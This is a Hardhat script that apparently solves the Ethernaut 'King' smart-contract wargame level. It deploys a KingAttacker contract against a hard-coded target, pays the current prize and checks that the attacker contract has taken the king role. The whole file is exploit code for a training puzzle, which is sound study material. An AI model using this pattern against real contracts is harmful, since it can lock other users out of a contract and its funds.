import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/9.King/King.sol/King.json";
import { BigNumber, Contract } from "ethers";

function setTargetContract() {
  const contractAddress = "0xCD62B7087510a382E6C931CAB8409BfF7470710a";
  return new Contract(contractAddress, abi);
}

async function main() {
  const [attacker] = await ethers.getSigners();
  // const contractAttacker = await deployContract("KingAttacker");
  const target = setTargetContract();
  const ContactFactory = await ethers.getContractFactory("KingAttacker");
  const KingAttacker = await ContactFactory.deploy(target.address);
  await KingAttacker.deployed();
  const prize = (await target.connect(attacker).prize()) as BigNumber;
  const tx = await KingAttacker.connect(attacker).attack({
    value: prize,
    gasLimit: "3000000",
  });
  await tx.wait();
  const _king = await target.connect(attacker)._king();
  console.log("Success: ", _king === KingAttacker.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
